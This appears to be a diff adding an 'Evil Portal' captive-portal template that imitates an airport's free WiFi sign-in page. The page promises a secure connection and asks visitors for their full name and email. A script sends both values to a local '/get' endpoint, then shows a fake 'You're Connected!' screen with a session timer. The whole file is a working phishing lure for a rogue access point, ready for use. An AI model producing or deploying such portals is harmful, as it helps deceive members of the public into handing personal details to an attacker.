@@ -1,0 +1,261 @@
+<!--
+  Evil Portal Template: Airport Free WiFi
+  
+  Airport/public space themed portal with email signup.
+  
+  Form fields:
+  - email: Email address
+  - password: Name (used for "registration")
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Airport Free WiFi</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f4f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .top-bar {
+            background: #0066cc;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .wifi-icon {
+            font-size: 24px;
+        }
+        .top-bar span {
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 440px;
+            overflow: hidden;
+        }
+        .card-header {
+            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+        .plane-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        .card-header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        .card-header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .card-body {
+            padding: 30px;
+        }
+        .benefits {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 25px;
+        }
+        .benefits h3 {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 6px;
+        }
+        .benefit-item:last-child { margin-bottom: 0; }
+        .check { color: #10b981; }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0066cc;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #0052a3;
+        }
+        .terms {
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+        .footer {
+            background: #f8fafc;
+            padding: 15px;
+            text-align: center;
+            border-top: 1px solid #eee;
+        }
+        .footer p {
+            font-size: 12px;
+            color: #999;
+        }
+        .success {
+            display: none;
+            text-align: center;
+            padding: 40px 30px;
+        }
+        .success.show { display: block; }
+        .success-icon {
+            font-size: 64px;
+            color: #10b981;
+            margin-bottom: 20px;
+        }
+        .success h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .success p {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        .timer {
+            background: #f0f4f8;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #666;
+        }
+        .timer strong {
+            color: #0066cc;
+        }
+        .form-container.hide { display: none; }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <span class="wifi-icon">📶</span>
+        <span>Airport Free WiFi</span>
+    </div>
+    
+    <div class="main">
+        <div class="card">
+            <div class="card-header">
+                <div class="plane-icon">✈️</div>
+                <h1>Connect to Free WiFi</h1>
+                <p>Complimentary internet for all travelers</p>
+            </div>
+            
+            <div class="form-container" id="formContainer">
+                <div class="card-body">
+                    <div class="benefits">
+                        <h3>What you get:</h3>
+                        <div class="benefit-item">
+                            <span class="check">✓</span> 2 hours of free high-speed WiFi
+                        </div>
+                        <div class="benefit-item">
+                            <span class="check">✓</span> Stream videos & video calls
+                        </div>
+                        <div class="benefit-item">
+                            <span class="check">✓</span> Secure encrypted connection
+                        </div>
+                    </div>
+                    
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <label>Full Name</label>
+                            <input type="text" name="password" placeholder="Enter your name" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Email Address</label>
+                            <input type="email" name="email" placeholder="your@email.com" required>
+                        </div>
+                        <button type="submit">Get Free WiFi Access</button>
+                    </form>
+                    
+                    <p class="terms">
+                        By connecting, you agree to our Terms of Service and Privacy Policy.
+                        Your session data may be logged for security purposes.
+                    </p>
+                </div>
+                
+                <div class="footer">
+                    <p>Need help? Visit the Information Desk</p>
+                </div>
+            </div>
+            
+            <div class="success" id="successMsg">
+                <div class="success-icon">🎉</div>
+                <h2>You're Connected!</h2>
+                <p>Enjoy your complimentary WiFi access</p>
+                <div class="timer">
+                    Session time remaining: <strong>1:59:58</strong>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var formData = new FormData(this);
+            var params = new URLSearchParams(formData).toString();
+            var img = new Image();
+            img.src = '/get?' + params;
+            document.getElementById('formContainer').classList.add('hide');
+            document.getElementById('successMsg').classList.add('show');
+        });
+    </script>
+</body>
+</html>
